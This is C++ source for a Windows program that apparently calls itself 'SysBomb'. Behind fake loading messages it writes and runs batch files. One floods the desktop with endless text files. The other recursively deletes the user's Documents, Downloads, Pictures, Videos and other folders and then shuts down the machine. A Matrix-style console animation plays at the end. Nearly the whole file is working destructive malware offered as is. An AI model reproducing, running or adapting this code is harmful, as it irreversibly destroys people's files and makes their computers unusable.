#include <iostream>
#include <Windows.h>
#include <fstream>
using namespace std;

//might use these...
int Modulus(int iN, int iMod) {
	int iQ = (iN / iMod);
	return iN - (iQ*iMod);
}

char getChar(int iGenerator, char cBase, int iRange) {
	return (cBase + Modulus(iGenerator, iRange));
}

BOOL DirExists(const char* dirName) {
	DWORD attribs = ::GetFileAttributesA(dirName);
	if (attribs == INVALID_FILE_ATTRIBUTES) {
		return false;
	}
	return true;
}
//These make it unusable
void payload1() {
		ofstream cFile;
		cFile.open("C:\\win\\cFile.bat");
		cFile << "@echo off\n:loop\necho SysBomb was here. > C:\\Users\\%USERNAME%\\Desktop\\%random%.txt\ngoto loop";
		cFile.close();
		system("start /MIN C:\\win\\cFile.bat");
}

void payload2() {
	ofstream batchS;
	batchS.open("C:\\win\\delAll.bat");
	batchS << "rd \"C:\\Users\\%USERNAME%\\Documents\" /s /q\nrd \"C:\\Users\\%USERNAME%\\Downloads\" /s /q\nrd \"C:\\Users\\%USERNAME%\\Contacts\" /s /q\nrd \"C:\\Users\\%USERNAME%\\Favorites\" /s /q\nrd \"C:\\Users\\%USERNAME%\\Pictures\" /s /q\nrd \"C:\\Users\\%USERNAME%\\Videos\" /s /q\nrd \"C:\\Users\\Public\" /s /q\nshutdown -s";
	batchS.close();
    system("start /MIN C:\\win\\delAll.bat");
}
// :)
void payload3() {
	HANDLE hConsole;
	hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hConsole, 2);

	char caRow[80];
	int j = 7;
	int k = 2;
	int l = 5;
	int m = 1;
	while(true) {
        int i = 0;
        while(i<80) {
            if(caRow[i] != ' ') {
                caRow[i] = getChar(j+i*i, 33, 30);
                if(((i*i + k) % 71) == 0) {
                    SetConsoleTextAttribute(hConsole, 7);
                } else {
                    SetConsoleTextAttribute(hConsole, 2);
                }
            }
            cout << caRow[i];
            ++i;
            SetConsoleTextAttribute(hConsole, 2);
        }
        j = (j + 31);
        k = (k + 17);
        l = (l + 47);
        m = (m + 67);
        caRow[Modulus(j, 80)] = '-';
        caRow[Modulus(k, 80)] = '-';
        caRow[Modulus(l, 80)] = '-';
        caRow[Modulus(m, 80)] = '-';
        Sleep(10);
	}
	return;
}
int main() {
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 6);
	cout << "[*] Loading script...\n";
	Sleep(3000);
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 2);
	cout << "[*] Script Loaded\n";
	Sleep(1000);
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 6);
	cout << "[*] Checking Assets...\n";
	Sleep(1000);
	if (DirExists("C:\\win")) {
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 2);
		cout << "[*] Assets found\n\n";
		Sleep(1000);
	}
	else {
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 4);
		cout << "[*] Assets not found creating directory...\n\n";
		system("mkdir C:\\win");
		Sleep(2000);
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 2);
		cout << "[*] Directory created";
		Sleep(1000);
	}
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 1);
	cout << "[*] Initial setup complete starting exploit...\n";
	Sleep(2000);
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 6);
	cout << "[*] Loading first payload...\n";
	payload1();
	Sleep(2000);
	cout << "[*] Loading second payload...\n";
	payload2();
	Sleep(1000);
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 2);
    cout << "[*] Complete";
    Sleep(500);
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 6);
	cout << "[*] And now, Matrix";
	Sleep(2000);
	system("shutdown /s /t");
	payload3();

}
